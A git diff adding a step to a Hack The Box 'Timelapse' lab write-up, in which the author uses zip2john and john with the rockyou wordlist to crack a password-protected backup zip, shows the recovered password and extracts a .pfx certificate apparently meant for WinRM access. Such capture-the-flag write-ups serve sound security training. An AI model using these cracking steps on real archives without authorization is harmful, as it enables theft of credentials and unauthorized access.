@@ -137,6 +137,47 @@ command:```get winrm_backup.zip```
 
 Good. Now we can try to unzip the file
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/31d9728c-c538-452f-9a30-e5c15afa25f1)
+
+A password is required but we don't have one. 
+
+Well, I called john already and he said he will be sending one of his brothers, ```zip2ohn```.
+
+Using ```zip2john``` we'll try to generate a hash that can be cracked with ```john```
+
+command:```zip2john winrm_backup.zip > winrm.txt```
+command:```john winrm.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Timelapse]
+└─$ zip2john winrm_backup.zip > winrm.txt
+ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Timelapse]
+└─$ john winrm.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt                                     
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
+1g 0:00:00:01 DONE (2023-09-25 22:48) 0.9259g/s 3216Kp/s 3216Kc/s 3216KC/s surkerior..superkebab
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+So we got the password to be ```supremelegacy```. Now lets unzip
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Timelapse]
+└─$ unzip winrm_backup.zip
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+  inflating: legacyy_dev_auth.pfx    
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Timelapse]
+└─$ ls -l legacyy_dev_auth.pfx 
+-rwxr-xr-x 1 bl4ck4non bl4ck4non 2555 Oct 25  2021 legacyy_dev_auth.pfx
+```
+cool the password worked and we got a file
 
 
 
